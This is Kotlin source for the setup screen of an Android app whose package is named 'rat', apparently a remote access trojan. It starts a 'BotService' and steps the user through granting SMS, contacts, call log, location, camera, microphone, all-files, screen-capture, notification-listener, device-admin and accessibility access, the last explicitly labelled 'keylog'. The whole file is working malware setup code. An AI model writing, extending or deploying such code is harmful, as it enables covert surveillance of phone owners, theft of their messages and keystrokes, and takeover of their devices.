package com.venice.rat

import android.Manifest
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.venice.rat.core.BotService
import com.venice.rat.core.U
import com.venice.rat.mod.Screen

class MainActivity : AppCompatActivity() {

    private val perms = mutableListOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CALL_PHONE
    ).apply {
        if (Build.VERSION.SDK_INT >= 33) {
            add(Manifest.permission.POST_NOTIFICATIONS)
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
            add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
            add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }
    }.toTypedArray()

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        BotService.start(this)

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(56, 120, 56, 56)
        }
        root.addView(TextView(this).apply {
            text = "Setup chalu karo — sab grant karo"
            textSize = 18f
        })
        fun btn(t: String, f: () -> Unit) {
            root.addView(Button(this).apply { text = t; setOnClickListener { f() } })
        }

        btn("1. Permissions") {
            ActivityCompat.requestPermissions(this@MainActivity, perms, 10)
        }
        btn("2. All files access") {
            if (Build.VERSION.SDK_INT >= 30) runCatching {
                startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:$packageName")))
            }
        }
        btn("3. Screen capture consent") {
            val m = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            startActivityForResult(m.createScreenCaptureIntent(), 20)
        }
        btn("4. Notification listener") {
            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
        }
        btn("5. Accessibility (keylog)") {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
        btn("6. Battery + Write settings") {
            U.batteryOpt(this@MainActivity)
            runCatching {
                startActivity(Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
                    Uri.parse("package:$packageName")))
            }
        }
        btn("7. Device Admin") { com.venice.rat.mod.Ctl.askAdmin(this@MainActivity) }
        btn("8. Shizuku (optional)") {
            runCatching {
                startActivity(Intent("moe.shizuku.manager.action.REQUEST_PERMISSION")
                    .setPackage("moe.shizuku.manager"))
            }
        }
        btn("DONE") { finishAffinity() }

        setContentView(root)
    }

    override fun onActivityResult(req: Int, res: Int, data: Intent?) {
        super.onActivityResult(req, res, data)
        if (req == 20 && res == RESULT_OK && data != null) {
            Screen.data = data
            Screen.code = res
        }
    }
}
